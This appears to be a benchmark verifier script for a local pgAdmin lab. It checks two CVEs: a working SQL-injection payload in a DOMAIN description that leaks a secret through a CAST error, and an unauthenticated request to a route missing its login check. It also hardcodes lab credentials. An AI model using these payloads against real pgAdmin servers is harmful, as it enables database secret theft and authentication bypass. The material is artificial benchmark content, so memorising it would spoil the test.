#!/usr/bin/env bash
# verify.sh --seed|--residual — pgadmin-cve-2026-17346 (PCBV2-0019)
#
# 机制：
#   seed     POST /browser/domain/obj/1/<sid>/<did>/<scid> 创建 DOMAIN，description
#            带单引号逃逸（9.15 domains create.sql 以未转义 '{{ description }}' 拼进
#            COMMENT ON DOMAIN ... IS '...'），注入第二语句
#            SELECT CAST((SELECT secret FROM pcb_secret LIMIT 1) AS int) --；
#            PostgreSQL 的 CAST 错误消息把 PCB flag 回显进 HTTP 响应 body
#            （pg_init.sh 已把 $PCB_FLAG 写入 pcb_secret）。9.16 起 qtLiteral(conn)
#            转义单引号 -> COMMENT 正常执行 -> body 无 flag（CVE-2026-12044 修复）。
#   residual 未认证（仅 CSRF token）GET /browser/constraints/nodes/1/1/1/1/1/
#            （Constraints blueprint 路由漏 @pga_login_required，CVE-2026-12046 修复
#            不完整链，9.17 才补装饰器）：9.16 上 route body 执行，connection_manager
#            对未认证用户抛 ObjectGone -> 410；9.17 上 302 -> /login。
#            效果通道 = 认证门状态类（blocked = 301/302/401/403；reached = 其余）。
# 判定基准 = RUN_FLAG_REF（回退 RUN_FLAG；wrong/stale 检查时 RUN_FLAG 为 override）。
# 退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }

CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
FLAG_REF="$RUN_FLAG"
mkdir -p "$WORK_DIR" 2>/dev/null || true

SVC="$VERSION"
PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" 80 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$PORT" ]] || { echo "verify: no published pgAdmin port" >&2; exit 20; }
export PCB_TARGET_PORT="$PORT"
"$PY" - "$PORT" "$FLAG_REF" "$MODE" "$VERSION" <<'PYEOF'
import re, sys, time, json, requests

port, flag, mode, version = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
base = f"http://127.0.0.1:{port}"
AUTH_REJECT = (301, 302, 401, 403)


def wait_ready(timeout=240):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            if requests.get(f"{base}/login", timeout=5).status_code == 200:
                return True
        except Exception:
            pass
        time.sleep(4)
    return False


def pg_session(authenticated):
    """CSRF-bearing session; authenticated=pgAdmin 登录态（seed 需要）。"""
    s = requests.Session()
    r = s.get(f"{base}/login", timeout=20)
    m = re.search(r'"csrfToken": "([^"]+)"', r.text)
    csrf = m.group(1) if m else ""
    if authenticated:
        m = re.search(r'"loginUrl": "([^"]+)"', r.text)
        url = m.group(1) if m else "/authenticate/login"
        r = s.post(f"{base}{url}",
                   data={"email": "admin@pcb-lab.com", "password": "Admin12345!",
                         "csrf_token": csrf, "language": "en"}, timeout=30)
        r = s.get(f"{base}/browser/js/utils.js", timeout=20)
        m = re.search(r"pgAdmin\['csrf_token'\] = '([^']+)'", r.text)
    s.headers["X-pgA-CSRFToken"] = m.group(1) if m else ""
    return s


def ensure_server(s):
    r = s.get(f"{base}/browser/server/obj/1", timeout=20)
    if r.status_code == 200:
        try:
            for node in (r.json().get("data") or []):
                if node.get("name") == "pg" and node.get("id"):
                    return node["id"]
        except Exception:
            pass
    payload = {"name": "pg", "host": "pg_" + version, "port": 5432, "db": "postgres",
               "username": "postgres", "password": "pcbpass", "ssl_mode": "prefer",
               "maintenance_db": "postgres", "save_password": True, "comment": ""}
    r = s.post(f"{base}/browser/server/obj/1", json=payload, timeout=30)
    if r.status_code not in (200, 201):
        raise RuntimeError(f"server create failed: {r.status_code} {r.text[:200]}")
    sid = int(r.json()["node"]["_id"])
    c = s.post(f"{base}/browser/server/connect/1/{sid}", json={"password": "pcbpass"}, timeout=40)
    if c.status_code not in (200, 201) and c.status_code != 410:
        raise RuntimeError(f"server connect failed: {c.status_code} {c.text[:200]}")
    return sid


def oid_of(s, url, name):
    r = s.get(url, timeout=20)
    r.raise_for_status()
    for node in (r.json() or []):
        if node.get("name") == name:
            return node["oid"]
    raise RuntimeError(f"{name} not found in tree")


def seed_probe():
    """创建 DOMAIN 触发未转义 description 的 SQL 注入；flag 在错误回显 body 中。"""
    s = pg_session(authenticated=True)
    sid = ensure_server(s)
    did = oid_of(s, f"{base}/browser/database/obj/1/{sid}", "postgres")
    scid = oid_of(s, f"{base}/browser/schema/obj/1/{sid}/{did}", "public")
    payload = {"name": "pcbdom", "basensp": "public", "basetype": "text",
               "owner": "postgres",
               "description": ("x'; SELECT CAST((SELECT secret FROM pcb_secret "
                               "LIMIT 1) AS int) --")}
    r = s.post(f"{base}/browser/domain/obj/1/{sid}/{did}/{scid}",
               data=json.dumps(payload),
               headers={"Content-Type": "application/json"}, timeout=30)
    return r.status_code, r.text


def residual_probe():
    """未认证 GET Constraints nodes 路由（漏 @pga_login_required）。"""
    s = pg_session(authenticated=False)
    r = s.get(f"{base}/browser/constraints/nodes/1/1/1/1/1/", timeout=20,
              allow_redirects=False)
    return r.status_code, r.text


if not wait_ready():
    print("verify: env not ready", file=sys.stderr)
    sys.exit(20)
try:
    if mode == "--seed":
        status, body = seed_probe()
        if status == 0:
            print("verify: request failed (status 0)", file=sys.stderr)
            sys.exit(20)
        # 注入成功时 pgAdmin 以 HTTP 500 回显 PostgreSQL 的 CAST 错误（含 flag），
        # 因此仅以 body 是否含 flag 判定；status 只区分请求是否发出。
        reached = flag in body
        print(f"[seed] status={status} flag_hit={reached} body_head={body[:120]!r}")
        sys.exit(0 if reached else 10)
    else:
        status, body = residual_probe()
        reached = status not in AUTH_REJECT
        print(f"[residual] status={status} reached={reached} body_head={body[:120]!r}")
        sys.exit(0 if reached else 10)
except requests.RequestException as e:
    print(f"verify: request failed: {e}", file=sys.stderr)
    sys.exit(20)
except Exception as e:
    print(f"verify: probe error: {type(e).__name__}: {e}", file=sys.stderr)
    sys.exit(20)
PYEOF
rc=$?
echo "verify[$MODE] version=$VERSION port=$PORT rc=$rc" >&2
exit "$rc"
